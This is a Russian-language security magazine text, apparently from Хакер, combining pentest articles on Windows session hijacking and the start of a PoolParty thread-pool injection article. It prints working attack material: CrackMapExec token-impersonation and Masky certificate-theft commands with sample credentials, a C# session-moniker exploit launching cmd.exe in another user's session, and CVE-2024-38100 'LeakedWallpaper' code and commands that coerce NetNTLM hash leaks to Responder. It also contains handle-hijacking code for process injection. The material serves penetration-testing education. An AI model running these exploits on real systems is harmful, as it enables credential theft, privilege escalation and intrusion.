$_.Name -eq 'IpAddress' }) .'#text'



        Write-Host "SID User: $targetUserSid"
        Write-Host "Username: $targetUserName"
        Write-Host "Domain: $targetDomainName"
        Write-Host "Logon Type: $logonType"
        Write-Host "IP Address: $ipAddress"
        Write-Host "----------"
    }
} catch {
    Write-Error "Error: $_"
}

Использование:


.\script.ps1 -ComputerName dc01 -UserName Администратор

 • ComputerName — имя компьютера, с которого тащить логи;
 • UserName — имя пользователя, чью сессию ищем.

Вариант на C# разработал наш китайский коллега. PoC ты найдешь в его ре‐
позитории.
   Следующим обращу твое внимание на событие 4768. Оно появляется
при выдаче билета TGT.





                             Событие 4768

Еще потенциально могут быть интересны события 4672 и 4769. Но согласись,
искать инструмент под каждое событие не очень‑то и удобно? Поэтому я раз‐
работал скрипт LogHunter, который автоматически парсит множество инте‐
ресных для нас событий и помогает искать сессии пользователя.
   Есть и более «дедовский» способ. Можно просто подключить оснастку
mmc.exe к удаленному устройству и обрабатывать логи в привычном для нас
приложении.


Процессы
Наконец, взгляни на процессы. К каждому процессу привязан токен, а в
токене содержится информация о том, от лица какого пользователя должен
работать исполняемый файл. В таком поиске нам поможет WMI.


Get-WmiObject -Query "Select * from Win32_Process" -Computer winpc |
where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label=
"Owner";Expression={$_.GetOwner() .User}} | ft -AutoSize

Этот командлет позволяет извлечь список процессов с устройства winpc,
после чего сразу же отфильтровать среди них служебные, которые нам
не очень интересны, а после вывести список процессов с именами поль‐
зователей‑владельцев.





           Использование WMI для поиска сессий пользователей




                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ
  ВРЕШЬ, НЕ УЙДЕШЬ!
                    КАК РАБОТАЕТ УГОН
          ПОЛЬЗОВАТЕЛЬСКИХ СЕССИЙ
                        В WINDOWS





КРАЖА СЕССИЙ

После успешного обнаружения сессии стоит попробовать захватить ее, то
есть выкрасть учетные данные. И здесь у нас появляется огромный простор
для фантазии!


Воруем TGS
Одним из исправно работающих способов кражи сессии в Windows я бы наз‐
вал TGSThief, мы его разбирали в статье «Абьюз сессий Windows по‑новому.
Получаем билеты TGT методом GIUDA». Вкратце: если мы начнем взаимодей‐
ствовать с LSA как Logon Process, то сможем запросить билет TGS для любой
сессии, то есть для любого  пользователя, который  находится с нами
на одном устройстве.
   Например, если у нас на хосте есть два пользователя: хакер и админис‐
тратор, то хакер с помощью TGSThief может попросить LSA выписать билет
TGS на имя администратора для какой‑нибудь службы, например CIFS кон‐
троллера домена.
   Однако возможные трюки этим не ограничиваются! В Windows AD сущес‐
твует служба krbtgt, которая принимает билет TGT, а отдает TGS. Что, если
мы выпишем билет TGS на службу krbtgt? Сможем ли мы получать другие
TGS? Ответ: да, сможем!
   Фактически если у нас на руках есть TGS на службу krbtgt, то это рав‐
носильно полноценному билету TGT!
   Таким образом мы сможем красть чужие TGT.
   Вот пример эксплуатации.





                          Использование TGSThief


Манипуляции с токенами
Имперсонация чужих токенов — это нестареющая классика эксплуатации
Windows. Атакующий, имея достаточные привилегии, нацепляет на свой про‐
цесс чужой токен и работает от лица другого пользователя. Кстати, эту атаку
мы проводили в статье «Свин API. Изучаем возможности WinAPI для пентесте‐
ра».
   Благодаря широкой известности этой атаки для нее написано достаточно
много вариантов PoC. Причем существуют и необычные, например эксплу‐
атация  через  WTS   API.   Процесс  может   запускаться  не  через
CreateProcessWithTokenW(), а через UpdateProcThreadAttribute().
  И вишенкой на торте идет CrackMapExec с модулем Impersonate. Исполь‐
зовать его легко.


# Получить список токенов на системе
    crackmapexec smb 10.10.10.10 -u 'Administrator' -p 'October2022'
-M impersonate


# Выполнить действия от лица другого пользователя
    crackmapexec smb 10.10.10.10 -u 'Administrator' -p 'October2022'
-M impersonate -o TOKEN=<номер желаемого токена> EXEC= <"команда для
запуска">


    crackmapexec smb 10.10.10.10 -u 'Administrator' -p 'October2022'
-M impersonate -o TOKEN= 0 EXEC="whoami"





                              Список токенов





                              Абьюз токенов


RemotePotato0
RemotePotato0 —  это  эксплоит  полузапатченного  бага,  позволяющий
повышать привилегии. Почему «полу-»? Потому что у меня на Windows
11 с последними обновлениями все сработало, хотя в Microsoft говорили, что
все пофиксили!
   Если вкратце, то этот инструмент злоупотребляет процессом активации
объектов DCOM, в ходе которой происходит аутентификация. Она ловится
и успешно релеится, например в службу LDAP. Эту интересную атаку опи‐
сывал мой коллега snovvcrash в статье «Картошка-0. Повышаем привилегии
в AD при помощи RemotePotato0».
   Однако если NTLM в домене отключен либо у тебя нет возможности нас‐
траивать сторонний хост с редиректом резолва OXID-запросов, то обращу
внимание на RemoteKrbRelay. Инструмент изначально задумывался для уда‐
ленного релея Kerberos, но никто тебе не мешает запустить его и против
локального компьютера. Поддерживается возможность релея в LDAP, SMB,
HTTP, что практически полностью повторяет функции RemotePotato0, разве
что используется Kerberos, а не NTLM.


Запрос чужих сертификатов
Раз мы заговорили об AD CS, напомню, что можно принудительно триггерить
сессию пользователя при заходе в AD CS, чтобы на него выписывался сер‐
тификат. Для этого можно воспользоваться утилитой Masky:


masky -d vostok.street -u dcom -p 'lolkekcheb123!' -dc-ip 192.168.
137.139 -ca "dc01.vostok.street\vostok-DC01-CA" -T user --no-pfx
--no-ccache 192.168.137.139 -v


# 192.168.137.139 — комп, с которого дампить





                           Использование Masky

Masky заходит на хост, получает список сессий, после чего для каждой зап‐
рашивает сертификат PFX, который можно использовать в  атаках Pass
the Certificate.
   Причем модуль поддерживается и в CrackMapExec.


# Поиск CA
    cme ldap 10.10.10.10 -u admin -p admin -M adcs


# Использование
    cme smb 10.10.10.10 -u admin -p admin -M masky -o CA="CA DN"





                           Эксплуатация Masky из CME


SeMishaPrivilege
Этот код можно использовать для запуска произвольных файлов от лица сто‐
роннего пользователя на системе. При этом не нужно явно назначать при‐
вилегии SeDebug/SeImpersonate. Изначально код шел как LPE-эксплоит COM
Session Moniker EOP, но к нему добавили всякие проверки.


if ( imp_token_il >= process_token_il
  && (imp_token_il >= SECURITY_MANDATORY_HIGH_RID
  || EqualSid(process_token_user, imp_token_user)))
{
   ShellExecuteW(NULL, L"open", path, NULL, NULL, SW_SHOW);
}

Поэтому теперь это просто способ абьюза сессий, если есть учетка локаль‐
ного администратора!
   Единственный минус — исполняемый файл будет запущен в неинтерак‐
тивном режиме. То есть из текущей сессии мы будем видеть только успешно
запущенный процесс, а в целевой сессии будут показываться GUI-приложе‐
ния  (если  есть).  Поэтому  таким  способом  удобно  запускать любые
реверс‑шеллы.


using System;
using System.Runtime.InteropServices;


namespace IHxHelpPaneServer
{
    static class Program
    {
        static void Main()
        {
            var path = "file:///C:/Windows/System32/cmd.exe";
            var session = System.Diagnostics.Process.
GetCurrentProcess();
            // Здесь указывай номер желаемой сессии, в которой
запускать пейлоад
            Server.execute(3.ToString(), path);
        }
    }
    static class Server
    {
        [ComImport, Guid("8cec592c-07a1-11d9-b15e-000d56bfe6ee"),
InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        interface IHxHelpPaneServer
        {
            void DisplayTask(string task);
            void DisplayContents(string contents);
            void DisplaySearchResults(string search);
            void Execute([MarshalAs(UnmanagedType.LPWStr)] string
file);
        }


        public static void execute(string new_session_id, string path
)
        {
            try
            {
                IHxHelpPaneServer server = (IHxHelpPaneServer)Marshal
.BindToMoniker(String.Format("session:{0}!new:
8cec58ae-07a1-11d9-b15e-000d56bfe6ee", new_session_id));
                Uri target = new Uri(path);
                server.Execute(target.AbsoluteUri);
            }
            catch
            {


            }
        }
    }
}

Перечислять доступные сессии можно с помощью WTSEnumerateSessions().
Рекомендую воспользоваться моим IHxExec или вариантом на PowerShell.
Пример эксплуатации я записал в виде ролика.


Leaked Wallpaper
Эта уязвимость задокументирована как CVE-2024-38100. Изначально ее
обнаружил автор блога decoder.cloud, однако его команды у меня не зарабо‐
тали. Впрочем, автор в конце статьи обратил мое внимание на то, что он
нашел интересный класс, который позволяет менять обои других пользовате‐
лей.
  И тут все встало на свои места! Меня осенило. А что, если вместо пути
до файла я предоставлю UNC Path? В таком случае обои не установятся,
но пользователь из целевой сессии принудительно обратится по UNC Path
и отправит запрос на аутентификацию, который мы сможем перехватить, нап‐
ример через Responder.
  Идея оказалась рабочей и позволяет получить хеш NetNTLM. Причем экс‐
плоит работает даже от лица пользователя с низкими привилегиями.
   Предлагаю рассмотреть пример эксплуатации. У нас есть учетная запись
exploit, которая абсолютно не привилегированная.





                          Привилегии пользователя

На компьютере также сидит привилегированная учетка — администратор.





                       Список сессий на устройстве

Для кражи его NetNTLM-хеша запускаем Responder.


responder -I eth1 -v

Теперь используем эксплоит и триггерим аутентификацию.


.\LeakedWallpaper.exe <session> \\<Kali IP>\c$\1.jpg


# EX
    .\LeakedWallpaper.exe 1 \\172.16.0.5\c$\1.jpg





                         Успешная эксплуатация


ВЫВОДЫ

Конечно же, приведенный здесь список способов поиска учетки все равно
не полный. Я попытался объединить наиболее необычные, красивые и просто
эффективные варианты. Хотя зачастую получается просто сдампить процесс
lsass.exe и извлечь учетные данные из него. Впрочем, согласись, лучше
знать, уметь и не пользоваться, чем не знать, не уметь и не пользоваться!
COVERSTORY





В Windows каждому пользователю при вхо‐
де на устройство приписывается своя сес‐
сия. Как угнать сессию пользователя, если
жертва решила зайти на уже взломанное
устройство? В этой статье познакомимся         MichelleVermishelle                                                                                       @Michaelzhm
еще с одним способом повышения при‐       michael.zhmailo@yandex.ru
вилегий — через кражу сессий с помощью
COM-классов.


Давным‑давно, когда небо было голубее, деревья зеленее, а чай слаще, я
писал статью «Поставщик небезопасности. Как Windows раскрывает пароль
пользователя». В ней мы подробно рассмотрели этап входа пользователя
в систему, начиная от приземления пятой точки за компьютер в офисе
и заканчивая получением доступа к рабочему столу.
   Впрочем, в той статье я перечислил далеко не все способы воздействия
на пользователя. Существует еще одна атака — кража сессии. И осуществим
мы ее с помощью COM!


LOGON SESSIONS

Итак, начнем с небольшого ликбеза. Logon Session (она же просто сессия) —
это как куки браузера. Вполне понятная вещица, по которой система может
однозначно определить, какой пользователь к ней обращается.
   Отличаются сессии по уникальному номеру, имя ему LUID (Locally Unique
IDentifier). Собственно, это все, что нужно Windows для идентификации сес‐
сии пользователя.


typedef struct _LUID {
  ULONG LowPart;
  LONG  HighPart;
} LUID, *PLUID;

 • LowPart — содержит необходимое числовое значение;
 • HighPart — обычно нолик.

Изучить     существующие     Logon-сессии     можно    через     API
LsaEnumerateLogonSessions().
  Я  достаточно подробно описывал эту функцию и ее использование
в статье про GIUDA. Для разнообразия перепишем на C#.


using System;
using System.Runtime.InteropServices;
using System.Security.Principal;


class Program
{
    [DllImport("Secur32.dll", SetLastError = false)]
    private static extern int LsaEnumerateLogonSessions(out ulong
LogonSessionCount, out IntPtr LogonSessionList);


    [DllImport("Secur32.dll", SetLastError = false)]
    private static extern int LsaGetLogonSessionData(IntPtr
LogonSession, out IntPtr ppLogonSessionData);


    [DllImport("Secur32.dll")]
    private static extern uint LsaFreeReturnBuffer(IntPtr buffer);


    [StructLayout(LayoutKind.Sequential)]
    private struct LSA_UNICODE_STRING
    {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }


    [StructLayout(LayoutKind.Sequential)]
    private struct SECURITY_LOGON_SESSION_DATA
    {
        public uint Size;
        public LUID LogonId;
        public LSA_UNICODE_STRING UserName;
        public LSA_UNICODE_STRING LogonDomain;
        public LSA_UNICODE_STRING AuthenticationPackage;
        public uint LogonType;
        public uint Session;
        public IntPtr Sid;
        public long LogonTime;
    }


    [StructLayout(LayoutKind.Sequential)]
    private struct LUID
    {
        public uint LowPart;
        public int HighPart;
    }


    private static string GetString(LSA_UNICODE_STRING unicodeString)
    {
        return Marshal.PtrToStringUni(unicodeString.Buffer);
    }


    static void Main()
    {
        var result = LsaEnumerateLogonSessions(out var count, out var
luidPtr);
        if (result != 0)
        {
            Console.WriteLine("LsaEnumerateLogonSessions failed");
            return;
        }


        var iter = luidPtr;
        for (ulong i = 0; i < count; i++)
        {
            result = LsaGetLogonSessionData(iter, out var
sessionDataPtr);
            if (result == 0)
            {
                var sessionData = Marshal.PtrToStructure<
SECURITY_LOGON_SESSION_DATA>(sessionDataPtr);
                var userName = GetString(sessionData.UserName);
                var domainName = GetString(sessionData.LogonDomain);


                Console.WriteLine($"UserName: {userName}");
                Console.WriteLine($"LogonDomain: {domainName}");
                Console.WriteLine("---------------------------");


                LsaFreeReturnBuffer(sessionDataPtr);
            }


            iter = IntPtr.Add(iter, Marshal.SizeOf(typeof(LUID)));
        }


        LsaFreeReturnBuffer(luidPtr);
    }
}





                      Пример работы программы

Видим стандартный импорт необходимых функций через PInvoke с последу‐
ющим вызовом в определенном порядке.
   Получить список сессий с устройства можно и  удаленно, здесь нам
помогут функции NetSessionEnum() и NetrSessionEnum(). Пример исполь‐
зования можешь посмотреть, например, на гитхабе trustedsec.
   Также можно воспользоваться инструментом netview.py.





                      Получение списка сессий удаленно

Наконец, помочь смогут встроенные инструменты командной строки.


qwinsta


# Если удаленно, то quser.exe
    quser.exe /server:dc01.office.corp





                          Использование qwinsta

Конечно же, есть и другие варианты поиска сессий целевого пользователя:
сюда входят и Invoke-UserHunter от PowerView, и бесконечные аналоги
на С#, все расписывать ни одной статьи не  хватит. Поэтому закончим
с реконом и перейдем к собственно угону.


        WWW

                            Если база у тебя хромает, советую изучить труд
                        Джареда Эткинсона на эту тему, в особенности
                             части 12 и 13.





                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ
           УГОН COM
            КАК РАБОТАЕТ КРАЖА СЕССИИ
                 ЧЕРЕЗ МЕХАНИЗМ COM





SESSION MONIKER

Аналогично Elevation Moniker в Windows существует моникер и для сессий.
Напомню, моникер — строковая репрезентация COM-объекта. Так вот, сес‐
сионный моникер может использоваться для инстанцирования COM-класса
в конкретной сессии.
   Например, если у нас есть COM-класс, один из методов которого поз‐
воляет выполнять команды, то, инстанцировав этот COM-класс внутри сессии
другого пользователя через Session Moniker, мы захватим сессию этого поль‐
зователя.
   Впрочем, не все так просто — в Microsoft наложили определенные огра‐
ничения, но с ними познакомимся чуть позже. Сначала предлагаю разобрать‐
ся с принципом работы Session Moniker. И сделаем это с помощью слайдов
Джеймса Форшоу.
   Итак, есть несколько объектов.





                        Начальное состояние системы

Есть сессия пользователя Alice (мы сидим в ней), есть сессия пользователя
Bob (ее будем захватывать). Также есть RPCSS — специальная служба, отве‐
чающая за активацию СОМ‑объектов.
   Запрашиваем активацию COM-объекта в сессии Боба.





                            Запрос активации

Этот запрос попадает в службу RPCSS потому, что активацией COM-объ‐
ектов управляет SCM. Затем служба RPCSS видит, что используется Session
Moniker, обнаруживает сессию Боба и создает COM-объект внутри нее.





                                 Активация

После успешной активации COM-объекта клиент (мы в сессии 1) получит ука‐
затель на интерфейс этого COM-объекта и сможет с ним взаимодействовать,
например вызвать метод для исполнения команды.





                      Возврат указателя на интерфейс

Для использования сессионного моникера достаточно подготовить строку
следующего вида:


"Session:[digits]!clsid:[class id]"

Здесь digits — это номер сессии, в которой запускать COM-класс, иден‐
тифицирующийся по CLSID из поля class id.
  С помощью этой функции можно создавать COM-объекты в чужой сессии.


HRESULT CoCreateInstanceInSession (DWORD session, REFCLSID rclsid ,
REFIID riid , void ** ppv) {
    BIND_OPTS3 bo = {};
    WCHAR wszCLSID [50];
    WCHAR wszMonikerName [300];
    StringFromGUID2 (rclsid, wszCLSID, _countof(wszCLSID));
    StringCchPrintf (wszMonikerName , _countof(wszMonikerName ),
    L"session:%d!new:%s" , session, wszCLSID);
    bo.cbStruct = sizeof(bo);
    bo.dwClassContext = CLSCTX_LOCAL_SERVER ;
    return CoGetObject (wszMonikerName , &bo, riid, ppv);
}

Кажется, если бы кто угодно мог инстанцировать COM-классы через Session
Moniker в чужих сессиях, это была бы брешь в обороне Windows. Получается
горизонтальное повышение привилегий (вертикальное — если есть сессия
администратора).
  Не все так плохо. Далеко не всегда получится инстанцировать COM-класс
в  сессии  целевого  пользователя через Session  Moniker.  Нужно,  чтобы
целевой COM-класс был зарегистрирован на запуск от лица интерактивного
пользователя. Это значение указывается в отдельном ключе реестра RunAs.
Если значение  пустое либо  указан запустивший пользователь, система
или сервис, то Session Moniker не сработает. Извлечь список всех объектов
удобно с помощью инструмента Checker. Он сгенерирует отчет в формате
CSV (или XLSX по желанию), после чего останется лишь применить фильтр
по необходимому полю.





                           Поиск нужных объектов

Затем ограничения накладываются в следующем приоритете. Никаких офи‐
циальных названий им нет, либо мне они незнакомы.
 1. SeDebug — если у тебя есть SeDebug, то можешь смело захватывать
   чужие сессии, например через IHxExec.
 2. Патч от CVE-2024-38100 (FakePotato) — если у тебя нет прав локального
   админа, ты не сможешь инстанцировать интерактивные (поле RunAs равно
   The Interactive User) COM-объекты внутри процесса explorer.exe.
   Фактически здесь просто исправили Access Permissions. Если у тебя нет
   этих прав на процесс, то получить доступ к работающим внутри него COM-
   объектам ты не сможешь. Если Access Permissions не определены для кон‐
   кретного AppID, то используются дефолтные. Просмотреть права можно
   с помощью инструмента OleViewDotNet.





              Список процессов с работающими COM-объектами





                Список работающих объектов внутри процесса





                         Дефолтные права на процесс

 3. Патч от EOP Session Moniker. Возможности сессионных моникеров извес‐
   тны уже давно, но их эксплуатация не особенно популярна. Как только
   безопасники начали их ресерчить, то практически сразу же появился экс‐
   плоит, позволяющий запустить определенный объект внутри чужой сес‐
   сии, что приводило к повышению привилегий. Фикс заключался в добав‐
   лении проверки на уровень целостности перед обращением к объекту.
   Если к объекту в чужой сессии пытаются обратиться из процесса со сред‐
  ним уровнем целостности, доступ блокируется.


ЗАПУСК ПРОЦЕССА В ЧУЖОЙ СЕССИИ

Итак, предлагаю обратиться к эксплоиту IHxExec. Он позволяет запустить
исполняемый файл внутри чужой сессии. Существует также реализация на C#
и PowerShell, ищи ее на GitHub.
  Оба варианта злоупотребляют сессионными моникерами для исполнения
кода. Если у нас есть права локального администратора (или привилегия
SeDebug), то таким образом удается выполнить код в сессиях другого поль‐
зователя.  Однако на  старых  системах, которые не  обновлялись  года
с 2017 года, такой трюк пройдет и от лица низкопривилегированного поль‐
зователя. Подробный анализ работы эксплоита есть на Medium.
   Если вкратце, то идет использование двух недокументированных COM-
интерфейсов, к которым обращаются и при инстанцировании сессионных
моникеров:  IStandardActivator  и  ISpecialSystemProperties.  Первый  нужен
для активации объектов, а у второго есть интересный метод SetSessionId()
для установки целевой сессии, внутри которой требуется запустить COM-
объект.





                   Пример использования эксплоита

Видим, что эксплоит успешно инстанцирует необходимый COM-объект, и мы
получаем возможность запуска произвольного файла внутри чужой сессии.


УТЕЧКА ХЕША ПАРОЛЯ ПРИ СМЕНЕ ОБОЕВ

Другой эксплоит вышел совсем недавно, он также основан на злоупотребле‐
нии сессионными моникерами, но теперь инстанцируемый COM-объект поз‐
воляет не запустить процесс, а сменить обои. Казалось бы, где тут уяз‐
вимость? Но стоит вспомнить статью Элада Шамира, в которой NetNTLM-хеш
компьютера извлекали через функцию изменения обоев. Я подумал: а что,
если инстанцировать интерактивный COM-объект внутри чужой сессии, затем
вызвать метод смены обоев и указать UNC Path для получения NetNTLM-
хеша?
  Идея долго не давала мне спать, и однажды, когда в блоге decoder.cloud
вышла одна подсказка, у меня получилось обнаружить подобный COM-объ‐
ект.





                          Обнаруженный объект

У  объекта был интерфейс  IDesktopWallpaper с подходящим по  логике
методом SetWallpaper().


HRESULT SetWallpaper(
  [in] LPCWSTR monitorID,
  [in] LPCWSTR wallpaper
);

Первым   аргументом   следует   передавать   идентификатор   монитора,
на который устанавливаются обои, вторым — путь к обоям. Собственно, ука‐
зание UNC Path во втором аргументе приведет к утечке NetNTLM-хеша. Одна‐
ко откуда получить идентификатор монитора?
  Сам MSDN нам любезно  подсказывает, что можно  воспользоваться
методом GetMonitorDevicePathAt(), этот метод, в свою очередь,  требует
для  вызова  параметр  monitorIndex,  который  можно  получить  через
GetMonitorDevicePathCount().
   Так выстраивается цепочка‑киллчейн:
 • GetMonitorDevicePathCount([out] int a) ;
 • GetMonitorDevicePathAt([in] a, [out] index);
 • SetWallpaper([in] index, [in] UNCPath).

При этом для утечки NetNTLM-хеша нужного пользователя следует инстан‐
цировать COM-класс по управлению обоями внутри чужой сессии. Это дела‐
ется с помощью функции CoCreateInstanceInSession().


HRESULT CoCreateInstanceInSession(DWORD session, REFCLSID rclsid,
REFIID riid, void** ppv) {
    BIND_OPTS3 bo = {};
    WCHAR wszCLSID[50];
    WCHAR wszMonikerName[300];
    StringFromGUID2(rclsid, wszCLSID, _countof(wszCLSID));
    StringCchPrintf(wszMonikerName, _countof(wszMonikerName),
        L"session:%d!new:%s", session, wszCLSID);
    bo.cbStruct = sizeof(bo);
    bo.dwClassContext = CLSCTX_LOCAL_SERVER;
    return CoGetObject(wszMonikerName, &bo, riid, ppv);
}


...


IDesktopWallpaper* pDesktopWallpaper = nullptr;
hr = CoCreateInstanceInSession(session, clsidShellWindows,
iidIShellWindows, (void**)&pDesktopWallpaper);
if (FAILED(hr)) {
    std::wcerr << L"CoCreateInstanceInSession failed with error: " <<
hr << std::endl;
    CoUninitialize();
    return 1;
}

После успешного инстанцирования можно обращаться к методам COM-клас‐
са.


UINT monitorCount;
hr = pDesktopWallpaper->GetMonitorDevicePathCount(&monitorCount);
if (FAILED(hr)) {
    std::wcerr << L"GetMonitorDevicePathCount failed with error: " <<
hr << std::endl;
    pDesktopWallpaper->Release();
    CoUninitialize();
    return 1;
}
for (UINT i = 0; i < monitorCount; i++) {
    LPWSTR monitorId;
    hr = pDesktopWallpaper->GetMonitorDevicePathAt(i, &monitorId);
    if (FAILED(hr)) {
        std::wcerr << L"GetMonitorDevicePathAt failed with error: " <
< hr << std::endl;
        continue;
    }
    hr = pDesktopWallpaper->SetWallpaper(monitorId, imagePath);
    std::wcout << L"[+] Check Responder" << std::endl;
    CoTaskMemFree(monitorId);
}





                         Успешная утечка хеша

Таким образом, если получается провернуть утечку хеша, то можно пойти
дальше и применить Relay-атаку. О них «Хакер» уже писал в статье «Гид
по NTLM Relay» (часть 1, часть 2).


ВЫВОДЫ

Вновь  плохо документированные  возможности Windows  позволяют  ата‐
кующим проводить интересные и красивые атаки. Самое сложное — найти ту
иголку в стоге сена, которая позволит раскрутить всё до полноценного экс‐
плоита!
COVERSTORY





Недавно  появился новый  вид  инжектов
в легитимные  процессы. Называется он
PoolParty  и  использует  Windows  Thread
Pools — масштабный и сложный механизм
управления  потоками  в  Windows.  Пред‐             Nik Zerof                                                                                              xtahi0nix@gmail.com
лагаю   разобраться,  как  устроен  этот
механизм и как его можно использовать
в пентестерских целях.


Инжекты — это техника внедрения своего кода в сторонние процессы
с целью получения контроля или выполнения нужных действий. Поскольку
такое может провернуть не только пентестер, но и злоумышленник, понима‐
ние этих техник позволяет эффективно предотвращать атаки и укреплять
защищенность.


           WARNING

                        Статья имеет ознакомительный характер и пред‐
                          назначена для специалистов по безопасности,
                          проводящих тестирование в рамках  контракта.
                       Автор  и  редакция  не  несут  ответственности
                        за любой вред,  причиненный с  применением
                          изложенной информации. Распространение вре‐
                         доносных программ, нарушение работы систем
                      и  нарушение  тайны  переписки  преследуются
                      по закону.



WINDOWS THREAD POOLS

Механизм Windows Thread Pools призван значительно упростить программис‐
там управление потоками. Под капотом решаются задачи асинхронного вза‐
имодействия и управления производительностью при помощи переисполь‐
зования существующих потоков — это сокращает затраты ресурсов на их
создание и уничтожение. Заодно решены проблемы с очередями потоков
и еще вагоном мелких тонкостей, которые бы свели с ума программиста,
если бы тот пытался реализовать все это самостоятельно.
   Код, управляющий пулами  потоков,  преимущественно  располагается
в режиме пользователя (ntdll.dll), и только небольшая его часть находится
в ядре — поэтому не приходится тратить ресурсы на частое переключение
контекстов между ядром и юзерспейсом.
   Вот основные узлы Windows Thread Pools:
 • рабочая фабрика (Worker Factory), которая управляет созданием и уда‐
   лением новых потоков;
 • рабочие очереди:
    • очередь задач (task queue) — задачи, которые передаются в пул. Эти
     задачи могут быть как быстрыми (выполняться в течение короткого вре‐
      мени), так и более длительными. Пул потоков автоматически масшта‐
      бируется — если задач много, пул может создать дополнительные
      потоки, чтобы справиться с нагрузкой;
    • очередь ввода‑вывода (I/O completion queue) выполняет задачи, свя‐
      занные с операциями ввода‑вывода, такие как файловые операции
     или сетевые запросы;
    • очередь таймера  (timer queue) позволяет выполнять задачи через
      определенные промежутки времени или в заданное время.

Именно эти части механизма Thread Pools наиболее интересны с точки зре‐
ния эксплуатации техники PoolParty.
   Надо сказать, что все процессы, работающие в Windows, используют
Thread Pools по умолчанию. Давай попробуем в этом убедиться эксперимен‐
тально — запустим Process Explorer, выберем любой процесс и перейдем
на вкладку Handles.





                    Фабрики в процессе svchost.exe

Как видишь, процесс svchost.exe использует Worker  Factory, а  значит,
механизм Thread Pools активен.
  Для демонстрации техники PoolParty мы попробуем атаковать рабочие
фабрики. А для этого нужно понять, как они создаются.


NTSTATUS NTAPI NtCreateWorkerFactory(
_Out_ PHANDLE WorkerFactoryHandleReturn,
_In_ ACCESS_MASK DesiredAccess,
_In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
_In_ HANDLE CompletionPortHandle,
_In_ HANDLE WorkerProcessHandle,
_In_ PVOID StartRoutine,
_In_opt_ PVOID StartParameter,
_In_opt_ ULONG MaxThreadCount,
_In_opt_ SIZE_T StackReserve,
_In_opt_ SIZE_T StackCommit
);

NtCreateWorkerFactory — функция NTAPI, которая создает рабочую фаб‐
рику  Thread  Pools.  Обрати  внимание  на  интересные  аргументы —
WorkerProcessHandle и StartRoutine.
   StartRoutine — это указатель на код, который будет выполнен фабрикой
при запуске нового потока, а WorkerProcessHandle — дескриптор процесса,
в контексте которого будут выполняться рабочие потоки. Это может быть дес‐
криптор текущего процесса или другого для распределенной обработки.
А что, если попробовать модифицировать код StartRoutine, чтобы он
выполнял наш пейлоад, таким образом заставляя фабрику работать на нас?
  Но до непосредственной модификации StartRoutine нужна небольшая
подготовка.


ЗАХВАТ ЦЕЛЕВОГО ДЕСКРИПТОРА

Взаимодействие с элементами Thread Pools реализуется через дескрипторы.
Соответственно, для получения доступа к рабочей фабрике целевого процес‐
са нужно сначала найти ее хендл и захватить его, используя функцию WinAPI
DuplicateHandle.
   Дескрипторы Thread Pools имеют несколько типов: если нужен доступ
к  рабочей  фабрике,  то  понадобится  дескриптор  с  типом  объекта
TpWorkerFactory, если к очереди таймера, то IRTimer, а если нужно обра‐
титься к очереди ввода‑вывода, то дескриптор с типом IoCompletion. Мы
атакуем  рабочую  фабрику,   соответственно,  ищем  тип  дескриптора
TpWorkerFactory.
  В      процессе     будут      использоваться     функции     NTAPI
NtQueryInformationProcess и NtQueryObject, их  адреса  нужно будет
получить динамически из ntdll.dll. Адреса других функций NTAPI, упомина‐
емых в статье, будут получаться аналогично.


typedef NTSTATUS(NTAPI* proto_NtQueryInformationProcess)(


    _In_ HANDLE ProcessHandle,
    _In_ PROCESSINFOCLASS ProcessInformationClass,
    _Out_writes_bytes_(ProcessInformationLength) PVOID
ProcessInformation,
    _In_ ULONG ProcessInformationLength,
    _Out_opt_ PULONG ReturnLength
    );


typedef NTSTATUS(NTAPI* proto_NtQueryObject)(


    _In_opt_ HANDLE Handle,
    _In_ OBJECT_INFORMATION_CLASS ObjectInformationClass,
    _Out_writes_bytes_opt_(ObjectInformationLength) PVOID
ObjectInformation,
    _In_ ULONG ObjectInformationLength,
    _Out_opt_ PULONG ReturnLength
);


...


proto_NtQueryInformationProcess ptr_NtQueryInformationProcess =
nullptr;
proto_NtQueryObject ptr_NtQueryObject = nullptr;


ptr_NtQueryInformationProcess = reinterpret_cast<
proto_NtQueryInformationProcess>(GetProcAddress(GetModuleHandleW(
L"ntdll.dll"), "NtQueryInformationProcess"));
prt_NtQueryObject = reinterpret_cast<proto_NtQueryObject>(
GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryObject"));

Далее при помощи функции GetProcessHandleCount получаем список всех
открытых дескрипторов для целевого процесса и выделяем память для струк‐
тур                           PROCESS_HANDLE_SNAPSHOT_INFORMATION
и PROCESS_HANDLE_TABLE_ENTRY_INFO. Памяти нужно с запасом — на случай,
если количество дескрипторов изменится с момента их получения.


GetProcessHandleCount(targetProcess, (PDWORD)&handles);
szTypeInfo = sizeof(PROCESS_HANDLE_SNAPSHOT_INFORMATION) + ((handles
+ 5) * sizeof(PROCESS_HANDLE_TABLE_ENTRY_INFO));
processes = static_cast<PPROCESS_HANDLE_SNAPSHOT_INFORMATION>(
HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, szTypeInfo));

Заполняем ранее выделенную память информацией о дескрипторах процес‐
са  при  помощи  вызова  NtQueryInformationProcess  с  аргументом
ProcessHandleInformation.


ptr_NtQueryInformationProcess(
    targetProcess,
    // ProcessHandleInformation
    (PROCESSINFOCLASS)51,
    // PPROCESS_HANDLE_SNAPSHOT_INFORMATION
    processes,
    szTypeInfo,
    NULL);

Далее необходимо  захватить все  дескрипторы  процесса, находящиеся
в  processes->NumberOfHandles.  Для  этого  для  каждого  дескриптора
вызываем DuplicateHandle, при помощи NtQueryObject получаем по нему
информацию в структуре PUBLIC_OBJECT_TYPE_INFORMATION и отсеиваем
нужные нам дескрипторы — с типом TpWorkerFactory.


DuplicateHandle(targetProcess,
    processes->Handles[i].HandleValue,
    GetCurrentProcess(),
    &gotchedHandle,
    accessFlags,
    FALSE,
    NULL)


prt_NtQueryObject(gotchedHandle,
    ObjectTypeInformation,
    // Вызываем NtQueryObject с NULL, чтобы получить данные о
размере необходимой памяти
    NULL,
    NULL,
    (PULONG)&objTypeLen);


objTypeInfo = static_cast<PPUBLIC_OBJECT_TYPE_INFORMATION>(HeapAlloc(
